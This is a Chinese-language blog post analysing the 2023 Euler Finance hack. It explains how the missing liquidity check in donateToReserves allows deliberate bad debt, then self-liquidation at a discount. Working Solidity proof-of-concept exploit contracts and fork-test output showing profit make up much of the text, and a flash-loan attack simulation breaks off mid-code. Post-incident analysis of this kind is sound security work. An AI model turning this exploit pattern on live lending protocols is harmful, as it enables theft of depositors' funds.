---
title: "Euler Finance 黑客攻击分析"
date: 2023-03-22T14:33:05+08:00
draft: false
author: yinhui
categories: [security]
tags: [defi] 
---

去中心化去审批化借贷平台Euler前端时间遭到最糟糕的一系列攻击。这里以以太坊主链[16817996高度的一次攻击](https://etherscan.io/tx/0xc310a0affe2169d1f6feec1c63dbc7f7c62a887fa48795d327d4d2da2d6b111d)为例，看看这个黑客是如何利用其漏洞实施攻击并获利的

<!--more-->

## Euler协议借贷简述

Euler协议实现的是有抵押的借贷， 用户将资产（比如DAI）抵押给平台，平台会发放该资产对应的eToken（比如eDAI）给用户，就像去赌场的时候给顾客换的筹码一样，顾客然后就可以去愉快地玩耍了，玩耍完成后再用eToken赎回抵押的资产（赢了可以赎回更多，输了赎回得更少）。但与赌场不同的是，Euler除了有表示筹码的eToken外，还有表示负债的dToken（比如dDAI）。

比如，你有100个eToken, 20个dToken, 那么最终你可以销毁掉20个eToken (eToken.burn函数)，其在销毁20个eToken的同时，也会销毁掉对应20个dToken，最终你剩余80个eToken，用这80个eToken的去换回部分或更多的抵押资产。

在Euler中没有传统的闪电贷，但有一个函数: eToken.mint() 该函数实现了和闪电贷相同的功能，你可以自己进行铸币，铸造完成后，你将收到一定数量的eToken 和 对应数量的 dToken(负债)。这实际上就是进行了一次借贷：你拥有了更多的eToken筹码了。 要成功退出借贷协议，你需要完成业务逻辑后，将你的负载清零，清零方式有多种，比如你可以burn eToken去消除负载，也可以花钱（比如使用DAI）调用repay函数去消除负债。

在运行过程中， 你的每次资金操作Euler都会检查你的财务健康状况，所谓财务健康状况就是“资债平衡”，在你抵押资产时，并不是1:1给你eToken的，而是有一定比例，参考[白皮书](https://docs.euler.finance/languages/white-paper-eng-chn#zhan-qi-yan-qi-liu-dong-xing-defer-liquidity) 这就形成了一定的安全区间，如果你的操作很可能使你的财务状况超过这个安全区间，你的财务操作会被revert, 以确保不形成坏账。

根据白皮书：当 Euler 用户的风险调整后负债超过了风险调整后债务时，就会被认为“违约”了。一个借款人刚刚进入“违约”状态时依然有足额的抵押来偿付它的贷款，但是会有被调整到可能无法偿付贷款的风险。结果来说，为了防止他们违约，就可能会对他们进行清算。

清算时债务会打折销售给清算者，当然你的资金也会转移给清算者。关键在这个打折，为了鼓励清算者，如果你违规得越厉害（健康分数越低）打折就越厉害。但实际情况是Eluer协议不会让你的财务健康状态太差，这很容易形成大额坏账，所以你每次的财务操作你都会检查你的财务健康状态，可能资不抵债就revert，也就是checkLiquidity函数

示例代码

```solidity
// 省略接口定义

// 违规测试
contract ViolatorTest is Test {
    uint256 constant initialFunding = 80000 ether;

    function setUp() public {
        vm.createSelectFork("mainnet", 16_817_995);
    }

    function checkHealth(address _who) private {
        //第一个参数是清算者地址， 不能传自己，否则会报错： [FAIL. Reason: e/liq/self-liquidation]
        IEuler.LiquidationOpportunity memory returnData = Euler
            .checkLiquidation(address(0), _who, address(DAI), address(DAI));

        emit log_named_decimal_uint("healthScore", returnData.healthScore, 18);
    }

    function testViolate() public {
        deal(address(DAI), address(this), initialFunding);

        DAI.approve(address(EulerLiquidation), type(uint256).max);
        eDAI.deposit(0, 10000 ether);

        console2.log(
            "i got  eDAI after eDAI.deposit",
            eDAI.balanceOf(address(this)) / 1 ether
        );

        console2.log(
            "i have dDAI after eDAI.deposit",
            dDAI.balanceOf(address(this)) / 1 ether
        );

        eDAI.mint(0, 50000 ether);

        console2.log(
            "i have eDAI after eDAI.mint",
            eDAI.balanceOf(address(this)) / 1 ether
        );

        console2.log(
            "i have dDAI after eDAI.mint",
            dDAI.balanceOf(address(this)) / 1 ether
        );

        //扔掉一部分eDAI
        eDAI.transfer(address(0), 100 ether); // 成功
        
        //检查财务健康状况，小于1表示资不抵债
        checkHealth(address(this));

        //-------------
        // //平账方式2选1
        // //1. 烧掉自己的和欠款数量(dDAI)相等的eDAI(如果还有那么多eDAI的话)
        // eDAI.burn(0, dDAI.balanceOf(address(this)));
        // //2.或花钱（DAI）平掉dDAI
        // // 如果抵押款不足以平账，自己又不主动平账，还想withdraw
        // // 会被判断违约 [FAIL. Reason: e/collateral-violation],执行逻辑会被revert
        dDAI.repay(0, dDAI.balanceOf(address(this)));

        ////平账后赎回抵押（只能赎回一部分了，另外一部分被扔掉了）

        console2.log(
            "i have eDAI after repay, i will withdraw them now",
            eDAI.balanceOfUnderlying(address(this)) / 1 ether
        );
        eDAI.withdraw(0, eDAI.balanceOfUnderlying(address(this)));

        console2.log(
            "i have eDAI at the end",
            eDAI.balanceOfUnderlying(address(this)) / 1 ether
        );

        console2.log(
            "i have dDAI at the end",
            dDAI.balanceOf(address(this)) / 1 ether
        );
        console2.log(
            "i have DAI at the end",
            DAI.balanceOf(address(this)) / 1 ether
        );
        console2.log(
            "i lost DAI in this game",
            (initialFunding - DAI.balanceOf(address(this))) / 1 ether
        );
    }
}
```

输出

```solidity
[PASS] testViolate() (gas: 568359)
Logs:
  i got  eDAI after eDAI.deposit 9784
  i have dDAI after eDAI.deposit 0
  i have eDAI after eDAI.mint 58704
  i have dDAI after eDAI.mint 50000
  healthScore: 1.123525638279678714
  i have eDAI after repay, i will withdraw them now 59897
  i have eDAI at the end 0
  i have dDAI at the end 0
  i have DAI at the end 79897
  i lost DAI in this game 102
```

在上面的代码中，我抵押了10000个DAI，收到了9784个eDAI, 然后贷款50000个eDAI, 又扔掉了100个eDAI，由于我抵押收到的eDAI为9784个远大于我扔掉的100个，相当于我扔掉的是自己的钱，所以我这个“扔掉操作”通过了健康检查，扔掉以后健康分数同样很高（大于1表示健康，小于1表示不健康），虽然亏了钱，但在Euler看来这属于正常操作，成功退出了协议。

相反的，如果我执行下面操作：

```solidity
//扔掉一部分eDAI
eDAI.transfer(address(0), 20000 ether); 
```

输出

```solidity
Compiler run successful

Running 1 test for test/poc.t.sol:ViolatorTest
[FAIL. Reason: e/collateral-violation] testViolate() (gas: 522373)
Logs:
  i got  eDAI after eDAI.deposit 9784
  i have dDAI after eDAI.deposit 0
  i have eDAI after eDAI.mint 58704
  i have dDAI after eDAI.mint 50000

Test result: FAILED. 0 passed; 1 failed; finished in 668.29ms

Failing tests:
Encountered 1 failing test in test/poc.t.sol:ViolatorTest
[FAIL. Reason: e/collateral-violation] testViolate() (gas: 522373)
```

我试图扔掉20000个eToken, 大于我质押得到的9784个eDAI，以为着我不仅要扔掉自己钱，还要从贷款的50000个中扔掉一部分，这我造成我严重的资不抵债, 肯定是不能通过财务健康检查（流动性检查）,所以操作被revert了。

## 漏洞

打开Euler官方的源代码, 以EToken为例: https://github.com/euler-xyz/euler-contracts/blob/dfaa7788b17ac7c2a826a3ed242d7181998a778f/contracts/modules/EToken.sol

其在各类财务操作中（比如[mint](https://github.com/euler-xyz/euler-contracts/blob/dfaa7788b17ac7c2a826a3ed242d7181998a778f/contracts/modules/EToken.sol#L206), [burn](https://github.com/euler-xyz/euler-contracts/blob/dfaa7788b17ac7c2a826a3ed242d7181998a778f/contracts/modules/EToken.sol#L234), [withdraw](https://github.com/euler-xyz/euler-contracts/blob/dfaa7788b17ac7c2a826a3ed242d7181998a778f/contracts/modules/EToken.sol#L180), [transfer](https://github.com/euler-xyz/euler-contracts/blob/dfaa7788b17ac7c2a826a3ed242d7181998a778f/contracts/modules/EToken.sol#L323)等），都调用了`checkLiquidity();`

```solidity
    function withdraw(uint subAccountId, uint amount) external nonReentrant {
        (address underlying, AssetStorage storage assetStorage, address proxyAddr, address msgSender) = CALLER();
        address account = getSubAccount(msgSender, subAccountId);

				// ... 
				// ...

        //!!! important !!!
        checkLiquidity(account);

        logAssetStatus(assetCache);
    }
```

关于流动性检查的算法参考代码:  https://github.com/euler-xyz/euler-contracts/blob/dfaa7788b17ac7c2a826a3ed242d7181998a778f/contracts/modules/RiskManager.sol#L290

唯独在 `donateToReserves()` 函数中没有调用`checkLiquidity();`进行账户流动性检查

```solidity
function donateToReserves(uint subAccountId, uint amount) external nonReentrant {
        (address underlying, AssetStorage storage assetStorage, address proxyAddr, address msgSender) = CALLER();
        address account = getSubAccount(msgSender, subAccountId);

        updateAverageLiquidity(account);
        emit RequestDonate(account, amount);

        AssetCache memory assetCache = loadAssetCache(underlying, assetStorage);

        uint origBalance = assetStorage.users[account].balance;
        uint newBalance;

        if (amount == type(uint).max) {
            amount = origBalance;
            newBalance = 0;
        } else {
            require(origBalance >= amount, "e/insufficient-balance");
            unchecked { newBalance = origBalance - amount; }
        }

        assetStorage.users[account].balance = encodeAmount(newBalance);
        assetStorage.reserveBalance = assetCache.reserveBalance = encodeSmallAmount(assetCache.reserveBalance + amount);

        emit Withdraw(assetCache.underlying, account, amount);
        //!!! 注意是地址0
        emitViaProxy_Transfer(proxyAddr, account, address(0), amount);

        logAssetStatus(assetCache);
    }
```

其中 [emitViaProxy_Transfer(proxyAddr, account, address(0), amount)](<https://github.com/euler-xyz/euler-contracts/blob/dfaa7788b17ac7c2a826a3ed242d7181998a778f/contracts/BaseModule.sol#L40>) 函数

```solidity
function emitViaProxy_Transfer(address proxyAddr, address from, address to, uint value) internal FREEMEM {
        (bool success,) = proxyAddr.call(abi.encodePacked(
                               uint8(3),
                               keccak256(bytes('Transfer(address,address,uint256)')),
                               bytes32(uint(uint160(from))),
                               bytes32(uint(uint160(to))),
                               value
                          ));
        require(success, "e/log-proxy-fail");
    }
```

那么`donateToReserves()`这个函数的含义就是：允许任何人将自己的eToken转移到地址0进行销毁。

这就可以让用户轻易形成坏账

示例：

```solidity
// 违规测试
contract ViolatorTest is Test {
    uint256 constant initialFunding = 80000 ether;

    function setUp() public {
        vm.createSelectFork("mainnet", 16_817_995);
    }

    function checkHealth(address _who) private {
        //第一个参数是清算者地址， 不能传自己，否则会报错： [FAIL. Reason: e/liq/self-liquidation]
        IEuler.LiquidationOpportunity memory returnData = Euler
            .checkLiquidation(address(0), _who, address(DAI), address(DAI));

        emit log_named_decimal_uint("healthScore", returnData.healthScore, 18);
    }

    function testViolate() public {
        deal(address(DAI), address(this), initialFunding);

        DAI.approve(address(EulerLiquidation), type(uint256).max);
        eDAI.deposit(0, 10000 ether);

        console2.log(
            "i got  eDAI after eDAI.deposit",
            eDAI.balanceOf(address(this)) / 1 ether
        );

        console2.log(
            "i have dDAI after eDAI.deposit",
            dDAI.balanceOf(address(this)) / 1 ether
        );

        eDAI.mint(0, 50000 ether);

        console2.log(
            "i have eDAI after eDAI.mint",
            eDAI.balanceOf(address(this)) / 1 ether
        );

        console2.log(
            "i have dDAI after eDAI.mint",
            dDAI.balanceOf(address(this)) / 1 ether
        );

        //扔掉一部分eDAI
        eDAI.donateToReserves(0, 50000 ether); // 成功 (没有检查账户的流动性)

        //检查财务健康状况，小于1表示资不抵债，只越小健康状况越糟糕，被清算时打折越厉害
        checkHealth(address(this));

        console2.log(
            "i have eDAI at the end",
            eDAI.balanceOfUnderlying(address(this)) / 1 ether
        );

        console2.log(
            "i have dDAI at the end",
            dDAI.balanceOf(address(this)) / 1 ether
        );
        console2.log(
            "i have DAI at the end",
            DAI.balanceOf(address(this)) / 1 ether
        );
        console2.log(
            "i lost DAI in this game",
            (initialFunding - DAI.balanceOf(address(this))) / 1 ether
        );
    }
}
```

输出

```solidity
[PASS] testViolate() (gas: 475552)
Logs:
  i got  eDAI after eDAI.deposit 9784
  i have dDAI after eDAI.deposit 0
  i have eDAI after eDAI.mint 58704
  i have dDAI after eDAI.mint 50000
  healthScore: 0.151828871132557943
  i have eDAI at the end 8896
  i have dDAI at the end 50000
  i have DAI at the end 70000
  i lost DAI in this game 10000
```

可以看到，通过捐赠5万eToken, 用户健康分数可以变得非常低 0.1518。

## 漏洞利用

上面展示漏洞的代码中我并没有去平账，没有还款也不能取回抵押物，让平台产生了坏账，但我也损失了10000DAI，所以其实是两败俱伤的场面。

要做到盈利：

1. 违规者大量造成坏账，然后躺平， 不还账也不取回抵押
2. 自己充当清算者，对违规者进行清算，平台会将违规者的债务（dDAI）做打折处理移交给清算者，同时将违规者的eDAI也会移交给清算者
3. 只要清算者的获利（eDAI 减去 dDAI的差额） 大于 最初违规者的抵押金额加上各种手续费，那么总体而言就是盈利

具体清算算法参考： https://github.com/euler-xyz/euler-contracts/blob/dfaa7788b17ac7c2a826a3ed242d7181998a778f/contracts/modules/Liquidation.sol#LL55C6-L55C6

注： 清算者需要新建一个合约，不能和违规者是同一个合约地址, 否则会报错：e/liq/self-liquidation

```solidity
require(!isSubAccountOf(liqLocs.violator, liqLocs.liquidator), "e/liq/self-liquidation");
```

示例：

```solidity
// 违规者
contract Violator {
    function DoSometingEvil() external {
        DAI.approve(address(EulerLiquidation), type(uint256).max);
        //质押 1万
        eDAI.deposit(0, 10000 ether);

        //贷款 19万
        eDAI.mint(0, 190000 ether);

        //捐赠3万8
        eDAI.donateToReserves(0, 38000 ether); // 成功 (没有检查账户的流动性)

        console2.log(
            "[Violator] eDAI at the end",
            eDAI.balanceOfUnderlying(address(this)) / 1 ether
        );

        console2.log(
            "[Violator] dDAI at the end",
            dDAI.balanceOf(address(this)) / 1 ether
        );
        console2.log(
            "[Violator] DAI at the end",
            DAI.balanceOf(address(this)) / 1 ether
        );
    }
}

// 清算者 
// 这里的 is Test 只是为了使用log_named_decimal_uint事件，并不真正是一个测试
contract Liquidator is Test {
    function liquidate(address liquidator, address violator) external {
        // 清算前，Liquidator没有eDAI,也没有dDAI
        console2.log(
            "[Liquidator] eDAI balance before liquidate: ",
            eDAI.balanceOf(liquidator) / 1e18
        );
        console2.log(
            "[Liquidator] dDAI balance after liquidate: ",
            dDAI.balanceOf(liquidator) / 1e18
        );

        // 计算清算机会
        IEuler.LiquidationOpportunity memory returnData = Euler
            .checkLiquidation(liquidator, violator, address(DAI), address(DAI));

        console2.log(
            "[Liquidator] checkLiquidation, repay: ",
            returnData.repay / 1e18
        );

        emit log_named_decimal_uint(
            "[Liquidator] checkLiquidation, yield: ",
            returnData.yield,
            18
        );

        emit log_named_decimal_uint(
            "[Liquidator] checkLiquidation, healthScore:: ",
            returnData.healthScore,
            18
        );
        emit log_named_decimal_uint(
            "[Liquidator] checkLiquidation, baseDiscount:",
            returnData.baseDiscount,
            18
        );

        emit log_named_decimal_uint(
            "[Liquidator] checkLiquidation, discount:",
            returnData.discount,
            18
        );

        emit log_named_decimal_uint(
            "[Liquidator] checkLiquidation, conversionRate:",
            returnData.conversionRate,
            18
        );

        // 清算
        Euler.liquidate(
            violator,
            address(DAI),
            address(DAI),
            returnData.repay,
            10 * 1e18
        );

        //清算后， 违规者的eDAI被转移给清算者
        emit log_named_decimal_uint(
            "[Liquidator] eDAI balance after liquidate: ",
            eDAI.balanceOf(liquidator),
            18
        );
        // 清算后， 违规者的dDAI（负债）也被转移给清算者（负债会按照打折价格转移给清算者）
        emit log_named_decimal_uint(
            "[Liquidator] dDAI balance after liquidate: ",
            dDAI.balanceOf(liquidator),
            18
        );

        // 平账
        eDAI.burn(0, dDAI.balanceOf(liquidator));

        //提款
        eDAI.withdraw(0, eDAI.balanceOfUnderlying(liquidator));

        emit log_named_decimal_uint(
            "[Liquidator] dDAI balance after withdraw: ",
            dDAI.balanceOf(address(liquidator)),
            18
        );
        emit log_named_decimal_uint(
            "[Liquidator] DAI balance after withdraw: ",
            DAI.balanceOf(liquidator),
            18
        );

        //转账
        DAI.transfer(msg.sender, DAI.balanceOf(address(this)));
    }
}

contract ViolatorTest is Test {
    uint256 constant initialFunding = 10000 ether;
    Violator violator;
    Liquidator liquidator;

    function setUp() public {
        vm.createSelectFork("mainnet", 16_817_995);
        violator = new Violator();
        liquidator = new Liquidator();

        deal(address(DAI), address(violator), initialFunding);
    }

    function checkHealth(address _who) private {
        IEuler.LiquidationOpportunity memory returnData = Euler
            .checkLiquidation(address(0), _who, address(DAI), address(DAI));

        emit log_named_decimal_uint("healthScore", returnData.healthScore, 18);
    }

    function testViolate() public {
        violator.DoSometingEvil();
        checkHealth(address(address(violator)));
        liquidator.liquidate(address(liquidator), address(violator));
        checkHealth(address(address(violator)));
        checkHealth(address(liquidator));

        emit log_named_decimal_uint(
            "total earned:",
            DAI.balanceOf(address(this)) - initialFunding,
            18
        );
    }
}
```

输出：

```solidity
[PASS] testViolate() (gas: 829299)
Logs:
  [Violator] eDAI at the end 161161
  [Violator] dDAI at the end 190000
  [Violator] DAI at the end 0
  healthScore: 0.785018620737387352
  [Liquidator] eDAI balance before liquidate:  0
  [Liquidator] dDAI balance after liquidate:  0
  [Liquidator] checkLiquidation, repay:  131507
  [Liquidator] checkLiquidation, yield: : 161161.326251641854872000
  [Liquidator] checkLiquidation, healthScore:: : 0.785018620737387352
  [Liquidator] checkLiquidation, baseDiscount:: 0.234981379262612648
  [Liquidator] checkLiquidation, discount:: 0.200000000000000000
  [Liquidator] checkLiquidation, conversionRate:: 1.250000000000000000
  [Liquidator] eDAI balance after liquidate: : 157681.244144472883914003
  [Liquidator] dDAI balance after liquidate: : 131507.642221339753575552
  [Liquidator] dDAI balance after withdraw: : 0.000000000000000000
  [Liquidator] DAI balance after withdraw: : 29653.684030302101296446
  healthScore: 0.000000000000000000
  healthScore: 115792089237316195423570985008687907853269984665640564039457.584007913129639935
  total earned:: 19653.684030302101296446
```

在上面的示例中， 违规者质押 1万 DAI, 进行一番骚操作后，造就了16万多的eDAI, 19万的dDAI, 健康度只有0.785， 然后躺平，等清算者进行清算， 清算者从违规者那里以打折价131507的价格（dDAI）拿到了157681的资产(eDAI)， 这里形成了一段差价，除去手续费、利息等杂费，清算者从平台划走29653， 减掉违规者质押成本1万， **最终盈利19653美刀**

注： 上面的代码中对于固定成本，在违规时需要不断尝试 不同 的mint数量和捐赠数量，以利益最大化

## 完整的POC代码

```solidity
// SPDX-License-Identifier: SEE LICENSE IN LICENSE
pragma solidity ^0.8.10;

import "forge-std/Test.sol";

//EToken
// <https://docs.euler.finance/developers/getting-started/contract-reference#ieuleretoken>
interface EToken {
    //将底层代币从发送者转移到 Euler 池中，并增加账户的 eToken
    function deposit(uint256 subAccountId, uint256 amount) external;

    //铸造 eToken 和相应数量的 dTokens（“自借”）
    function mint(uint256 subAccountId, uint256 amount) external;

    //销毁 eToken 和相应数量的 dTokens （“自还”）
    function burn(uint subAccountId, uint amount) external;

    //向储备金捐赠代币
    function donateToReserves(uint256 subAccountId, uint256 amount) external;

    //将底层代币从 Euler 池中转移到发送方，并减少账户的 eTokens
    function withdraw(uint256 subAccountId, uint256 amount) external;

    function balanceOf(address account) external view returns (uint);

    function balanceOfUnderlying(address account) external view returns (uint);

    function transfer(address to, uint amount) external returns (bool);
}

//https://docs.euler.finance/developers/getting-started/contract-reference#ieulerdtoken
interface DToken {
    
    function repay(uint256 subAccountId, uint256 amount) external;

    function balanceOf(address account) external view returns (uint);
}

interface IEuler {
    //清算机会
    struct LiquidationOpportunity {
        //清算金额
        uint256 repay;
        //收益
        uint256 yield;
        //健康分数
        uint256 healthScore;
        //基础折扣
        uint256 baseDiscount;
        //折扣
        uint256 discount;
        //转换率
        uint256 conversionRate;
    }

    function liquidate(
        //清算者
        address violator,
        //底层代币(将要偿还的代币)
        address underlying,
        //抵押代币
        address collateral,
        //违规者要转给sender的基础DToken的数量，单位为基础代币。
        uint256 repay,
        //违规者要转给sender的EToken的最低可接受数量
        uint256 minYield
    ) external;

    //检查清算机会
    function checkLiquidation(
        //清算者
        address liquidator,
        //违规者
        address violator,
        //底层代币(将要偿还的代币)
        address underlying,
        //抵押代币
        address collateral
    ) external returns (LiquidationOpportunity memory liqOpp);
}

interface IERC20 {
    function approve(address spender, uint256 amount) external returns (bool);

    function balanceOf(address) external view returns (uint256);

    function decimals() external view returns (uint8);

    function transfer(
        address recipient,
        uint256 amount
    ) external returns (bool);
}

// <https://docs.euler.finance/euler-protocol/addresses#mainnet>
IEuler constant Euler = IEuler(0xf43ce1d09050BAfd6980dD43Cde2aB9F18C85b34);
address constant EulerLiquidation = 0x27182842E098f60e3D576794A5bFFb0777E025d3;
IERC20 constant DAI = IERC20(0x6B175474E89094C44Da98b954EedeAC495271d0F);
EToken constant eDAI = EToken(0xe025E3ca2bE02316033184551D4d3Aa22024D9DC);
DToken constant dDAI = DToken(0x6085Bc95F506c326DCBCD7A6dd6c79FBc18d4686);

contract Violator {
    function DoSometingEvil() external {
        DAI.approve(address(EulerLiquidation), type(uint256).max);
        //质押
        eDAI.deposit(0, 10000 ether);

        //贷款
        eDAI.mint(0, 190000 ether);

        //扔掉一部分eDAI
        eDAI.donateToReserves(0, 38000 ether); // 成功 (没有检查账户的流动性)

        console2.log(
            "[Violator] eDAI at the end",
            eDAI.balanceOfUnderlying(address(this)) / 1 ether
        );

        console2.log(
            "[Violator] dDAI at the end",
            dDAI.balanceOf(address(this)) / 1 ether
        );
        console2.log(
            "[Violator] DAI at the end",
            DAI.balanceOf(address(this)) / 1 ether
        );
    }
}

contract Liquidator is Test {
    function liquidate(address liquidator, address violator) external {
        // 清算前，Liquidator没有eDAI,也没有dDAI
        console2.log(
            "[Liquidator] eDAI balance before liquidate: ",
            eDAI.balanceOf(liquidator) / 1e18
        );
        console2.log(
            "[Liquidator] dDAI balance after liquidate: ",
            dDAI.balanceOf(liquidator) / 1e18
        );

        // 计算清算机会
        IEuler.LiquidationOpportunity memory returnData = Euler
            .checkLiquidation(liquidator, violator, address(DAI), address(DAI));

        console2.log(
            "[Liquidator] checkLiquidation, repay: ",
            returnData.repay / 1e18
        );

        emit log_named_decimal_uint(
            "[Liquidator] checkLiquidation, yield: ",
            returnData.yield,
            18
        );

        emit log_named_decimal_uint(
            "[Liquidator] checkLiquidation, healthScore:: ",
            returnData.healthScore,
            18
        );
        emit log_named_decimal_uint(
            "[Liquidator] checkLiquidation, baseDiscount:",
            returnData.baseDiscount,
            18
        );

        emit log_named_decimal_uint(
            "[Liquidator] checkLiquidation, discount:",
            returnData.discount,
            18
        );

        emit log_named_decimal_uint(
            "[Liquidator] checkLiquidation, conversionRate:",
            returnData.conversionRate,
            18
        );

        // 清算
        Euler.liquidate(
            violator,
            address(DAI),
            address(DAI),
            returnData.repay,
            10 * 1e18
        );

        //清算后， 违规者的eDAI被转移给清算者
        emit log_named_decimal_uint(
            "[Liquidator] eDAI balance after liquidate: ",
            eDAI.balanceOf(liquidator),
            18
        );
        // 清算后， 违规者的dDAI（负债）也被转移给清算者（负债会按照打折价格转移给清算者）
        emit log_named_decimal_uint(
            "[Liquidator] dDAI balance after liquidate: ",
            dDAI.balanceOf(liquidator),
            18
        );

        // 平账
        eDAI.burn(0, dDAI.balanceOf(liquidator));

        //提款
        eDAI.withdraw(0, eDAI.balanceOfUnderlying(liquidator));

        emit log_named_decimal_uint(
            "[Liquidator] dDAI balance after withdraw: ",
            dDAI.balanceOf(address(liquidator)),
            18
        );
        emit log_named_decimal_uint(
            "[Liquidator] DAI balance after withdraw: ",
            DAI.balanceOf(liquidator),
            18
        );

        //转账
        DAI.transfer(msg.sender, DAI.balanceOf(address(this)));
    }
}

contract ViolatorTest is Test {
    uint256 constant initialFunding = 10000 ether;
    Violator violator;
    Liquidator liquidator;

    function setUp() public {
        vm.createSelectFork("mainnet", 16_817_995);
        violator = new Violator();
        liquidator = new Liquidator();

        deal(address(DAI), address(violator), initialFunding);
    }

    function checkHealth(address _who) private {
        IEuler.LiquidationOpportunity memory returnData = Euler
            .checkLiquidation(address(0), _who, address(DAI), address(DAI));

        emit log_named_decimal_uint("healthScore", returnData.healthScore, 18);
    }

    function testViolate() public {
        violator.DoSometingEvil();
        checkHealth(address(address(violator)));
        liquidator.liquidate(address(liquidator), address(violator));
        checkHealth(address(address(violator)));
        checkHealth(address(liquidator));

        emit log_named_decimal_uint(
            "total earned:",
            DAI.balanceOf(address(this)) - initialFunding,
            18
        );
    }
}
```

输出

```solidity
[PASS] testViolate() (gas: 860010)
Logs:
  [Violator] eDAI at the end 161161
  [Violator] dDAI at the end 190000
  [Violator] DAI at the end 0
  healthScore: 0.785018620737387352
  [Liquidator] eDAI balance before liquidate:  0
  [Liquidator] dDAI balance after liquidate:  0
  [Liquidator] checkLiquidation, repay:  131507
  [Liquidator] checkLiquidation, yield: : 161161.326251641854872000
  [Liquidator] checkLiquidation, healthScore:: : 0.785018620737387352
  [Liquidator] checkLiquidation, baseDiscount:: 0.234981379262612648
  [Liquidator] checkLiquidation, discount:: 0.200000000000000000
  [Liquidator] checkLiquidation, conversionRate:: 1.250000000000000000
  [Liquidator] eDAI balance after liquidate: : 157681.244144472883914003
  [Liquidator] dDAI balance after liquidate: : 131507.642221339753575552
  [Liquidator] dDAI balance after withdraw: : 0.000000000000000000
  [Liquidator] DAI balance after withdraw: : 29013.348922583010640175
  healthScore: 0.000000000000000000
  healthScore: 115792089237316195423570985008687907853269984665640564039457.584007913129639935
  total earned:: 19013.348922583010640175
```

成本1万，净利润19013刀

## 黑客攻击模拟代码

tx： https://etherscan.io/tx/0xc310a0affe2169d1f6feec1c63dbc7f7c62a887fa48795d327d4d2da2d6b111d

相比于我上面的POC，下面的模拟黑客攻击的代码有几点不同

1. 黑客没有花自己的钱去抵押，而是使用的AaveV2闪电贷的贷款进行的攻击
2. 为了最大化获利，制造更大的坏账， 黑客两次调用了mint函数， 在第二次调用mint之前还了一部分款是为了增加自己的财务健康度，以便完成第二次贷款
3. 黑客的清算者没有平账（没有还钱），也没必要平账，完成清算后其eDAI数量远远大于dDAI数量。比如你有100 eDAI, 20的dDAI, 有80盈余，withdraw部分盈余自然不需要平账
4. 黑客的清算者的eDAI数量和dDAI数量的差额远远大于平台上DAI的总量，所以withdraw的时候数量用的是平台的全部额度 eDAI.withdraw(*0*, *DAI*.balanceOf(EulerLiquidation));

```solidity
// SPDX-License-Identifier: SEE LICENSE IN LICENSE
pragma solidity ^0.8.10;

import "forge-std/Test.sol";

// <https://docs.euler.finance/developers/getting-started/contract-reference#ieuleretoken>
interface EToken {
    //将底层代币从发送者转移到 Euler 池中，并增加账户的 eToken
    function deposit(uint256 subAccountId, uint256 amount) external;

    //铸造 eToken 和相应数量的 dTokens（“自借”）
    function mint(uint256 subAccountId, uint256 amount) external;

    //销毁 eToken 和相应数量的 dTokens （“自还”）
    function burn(uint subAccountId, uint amount) external;

    //向储备金捐赠代币
    function donateToReserves(uint256 subAccountId, uint256 amount) external;

    //将底层代币从 Euler 池中转移到发送方，并减少账户的 eTokens
    function withdraw(uint256 subAccountId, uint256 amount) external;

    function balanceOf(address account) external view returns (uint);

    function balanceOfUnderlying(address account) external view returns (uint);

    function transfer(address to, uint amount) external returns (bool);
}

//https://docs.euler.finance/developers/getting-started/contract-reference#ieulerdtoken
interface DToken {
    function repay(uint256 subAccountId, uint256 amount) external;

    function balanceOf(address account) external view returns (uint);
}

interface IEuler {
    //清算机会
    struct LiquidationOpportunity {
        //清算金额
        uint256 repay;
        //收益
        uint256 yield;
        //健康分数
        uint256 healthScore;
        //基础折扣
        uint256 baseDiscount;
        //折扣
        uint256 discount;
        //转换率
        uint256 conversionRate;
    }

    function liquidate(
        //清算者
        address violator,
        //底层代币(将要偿还的代币)
        address underlying,
        //抵押代币
        address collateral,
        //违规者要转给sender的基础DToken的数量，单位为基础代币。
        uint256 repay,
        //违规者要转给sender的EToken的最低可接受数量
        uint256 minYield
    ) external;

    //检查清算机会
    function checkLiquidation(
        //清算者
        address liquidator,
        //违规者
        address violator,
        //底层代币(将要偿还的代币)
        address underlying,
        //抵押代币
        address collateral
    ) external returns (LiquidationOpportunity memory liqOpp);
}

interface IERC20 {
    function approve(address spender, uint256 amount) external returns (bool);

    function balanceOf(address) external view returns (uint256);

    function decimals() external view returns (uint8);

    function transfer(
        address recipient,
        uint256 amount
    ) external returns (bool);
}

// <https://docs.aave.com/developers/core-contracts/pool#flashloan>
interface IAaveFlashloan {
    function flashLoan(
        address receiver,
        address[] calldata assets,
        uint256[] calldata amounts,
        uint256[] calldata modes,
        address onBehalfOf,
        bytes calldata params,
        uint16 referralCode
    ) external;
}

// <https://docs.euler.finance/euler-protocol/addresses#mainnet>
IEuler constant Euler = IEuler(0xf43ce1d09050BAfd6980dD43Cde2aB9F18C85b34);
address constant EulerLiquidation = 0x27182842E098f60e3D576794A5bFFb0777E025d3;
IERC20 constant DAI = IERC20(0x6B175474E89094C44Da98b954EedeAC495271d0F);
EToken constant eDAI = EToken(0xe025E3ca2bE02316033184551D4d3Aa22024D9DC);
DToken constant dDAI = DToken(0x6085Bc95F506c326DCBCD7A6dd6c79FBc18d4686);
IAaveFlashloan constant AaveV2 = IAaveFlashloan(
    0x7d2768dE32b0b80b7a3454c06BdAc94A69DDc7A9
);

contract Violator {
    function DoSometingEvil() external {
        DAI.approve(EulerLiquidation, type(uint256).max);

        //将借款来的3000万DAI中的2000万DAI存入Euler池，
        //并获得1950万的eDAI
        eDAI.deposit(0, 20_000_000 * 1e18);
        console2.log(
            "[Violator] eDAI balance after deposit DAI: ",
            eDAI.balanceOf(address(this)) / 1e18
        );

        //铸造2亿eDAI (获得2亿dDAI，即欠款2亿)
        eDAI.mint(0, 200_000_000 * 1e18);

        console2.log(
            "[Violator] eDAI balance after eDAI.mint: ",
            eDAI.balanceOf(address(this)) / 1e18
        );
        console2.log(
            "[Violator] dDAI balance after eDAI.mint: ",
            dDAI.balanceOf(address(this)) / 1e18
        );
        //使用DAI去还款1000万，此时贷款的3000万DAI被花光
        //还拥有1.9亿dDAI，即欠款1.9亿
        dDAI.repay(0, 10_000_000 * 1e18);

        console2.log(
            "[Violator] dDAI balance after dDAI.repay: ",
            dDAI.balanceOf(address(this)) / 1e18
        );
        console2.log(
            "[Violator] eDAI balance after dDAI.repay: ",
            eDAI.balanceOf(address(this)) / 1e18
        );
        console2.log(
            "[Violator] DAI balance after eDAI.mint: ",
            DAI.balanceOf(address(this)) / 1e18
        );
        //再铸造2亿eDAI (获得2亿dDAI，即欠款2亿)
